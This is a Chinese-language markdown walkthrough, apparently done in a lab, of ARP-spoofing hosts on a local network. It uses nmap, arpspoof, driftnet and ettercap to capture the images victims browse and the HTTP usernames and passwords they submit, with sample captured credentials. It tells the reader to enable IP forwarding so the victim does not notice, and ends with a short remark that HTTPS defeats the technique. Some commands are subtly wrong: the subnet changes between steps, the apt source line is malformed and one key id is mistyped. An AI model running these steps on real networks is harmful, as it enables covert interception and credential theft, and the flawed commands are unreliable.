> ## arp 截取web图片与账号密码

* #### 进行 arp 欺骗

```shell
# 扫描同网段的机器
nmap -sP 192.168.10.*

​```result
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 04:59 EDT
Nmap scan report for 192.168.6.2
Host is up (0.00036s latency).
MAC Address: 00:50:56:FF:00:94 (VMware)
Nmap scan report for 192.168.6.136
Host is up (0.00071s latency).
MAC Address: 00:0C:29:86:5C:97 (VMware)
Nmap scan report for 192.168.6.254
Host is up (0.000091s latency).
MAC Address: 00:50:56:EC:33:4B (VMware)
Nmap scan report for 192.168.6.135
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.94 seconds
​```

# arp 欺骗之前必须要开启IP转发, 否则当欺骗成功之后, 目标机会断网, 这样会被对方察觉; 输出1,说明已经成功开启IP转发
# 设置ip转发
sysctl -w net.ipv4.ip_forward=1
cat /proc/sys/net/ipv4/ip_forward

​```result
1
​```

# 查询自己的ip
ifconfig

​```result
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.6.135  netmask 255.255.255.0  broadcast 192.168.6.255
        inet6 fe80::20c:29ff:fe14:4633  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:14:46:33  txqueuelen 1000  (Ethernet)
        RX packets 691734  bytes 757137083 (722.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 9398  bytes 639148 (624.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 60  bytes 2676 (2.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 60  bytes 2676 (2.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
​```

# 语法 arpspoof -i <网卡> -t <目标机器IP> <目标机器IP> 
# 目标机器IP 可以是一个ip段 Demo
arpspoof 192.168.6.1 192.168.6.255

​```result
0:c:29:14:46:33 0:0:0:0:0:0 0806 42: arp reply 192.168.6.255 is-at 0:c:29:14:46:33
0:c:29:14:46:33 0:0:0:0:0:0 0806 42: arp reply 192.168.6.255 is-at 0:c:29:14:46:33
0:c:29:14:46:33 0:0:0:0:0:0 0806 42: arp reply 192.168.6.255 is-at 0:c:29:14:46:33
​```

# 此时可以看一下目标主机ARP缓存对比
arp -a

​```result
接口: 192.168.6.136 --- 0x6
  Internet 地址         物理地址              类型
  192.168.6.2           00-50-56-ff-00-94     动态
  192.168.6.135         00-0c-29-14-46-33     动态
  224.0.0.22            01-00-5e-00-00-16     静态
  224.0.0.251           01-00-5e-00-00-fb     静态
  224.0.0.252           01-00-5e-00-00-fc     静态
  239.255.255.250       01-00-5e-7f-ff-fa     静态
  255.255.255.255       ff-ff-ff-ff-ff-ff     静态

----------------------old/new----------------------

接口: 192.168.6.136 --- 0x6
  Internet 地址         物理地址              类型
  192.168.6.2           00-50-56-ff-00-94     动态
  192.168.6.135         00-0c-29-14-46-33     动态
  192.168.6.254         00-50-56-ec-33-4b     动态
  224.0.0.22            01-00-5e-00-00-16     静态
  224.0.0.251           01-00-5e-00-00-fb     静态
  224.0.0.252           01-00-5e-00-00-fc     静态
  239.255.255.250       01-00-5e-7f-ff-fa     静态
  255.255.255.255       ff-ff-ff-ff-ff-ff     静态
​```
```

* 有部分系统可能没有安装 arpspoof 执行指令时找不到
  * 一般情况
    * sudo apt-get update
    * apt-get install dsniff ssldump
  * 非一般情况
    * cd /etc/apt/
    * sudo cp sources.list sources.list.bb 
    * echo 'dev http://archive.ubuntu.com/ubuntu/ trusty main universe restricted multiverse ' >> sources.list
    * sudo apt-get update
      * 如果更新是出现 由于没有公钥, 无法验证下列签名: NO_PUBKEY 40976EAF437D05B5 NO_PUBKEY 3B4FE6ACC0B21F32 就执行如下指令
        * sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 40976EAF437D058B5
        * sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32 
        * sudo apt-get update
    * apt-get install dsniff ssldump
  * arpspoof 安装成功

* #### 开始抓取web图片

```shell
# 在 arpspoof 启动的基础上
# 安装 driftnet
apt-get install driftnet
# 启动监听网卡 语法 driftnet -i <网卡> -d <保存的本地目录> -a # -a后台启动
driftnet -i eth0 -d arpImg -a
```

* #### 开始抓取web提交的账号密码

```shell
# 这条命令表示监控eth0网卡的流量 ettercap 语法 -T 文本模式运行 -q 安静模式 -i 网卡, 后接网卡名
ettercap -Tq -i eth0

​```result
HTTP : 121.41.88.106:80 -> USER: admin  PASS: 123465  INFO: http://www.xnote.cn/                                            
CONTENT: username=admin&password=123465
​```
```

* #### 实战后总结

  * 目标机器被arp欺骗后 google chrome 访问正常的页面会提示不安全的连接
  *  https 类型的连接可以避免: 抓取web图片 与 web 提交的账号密码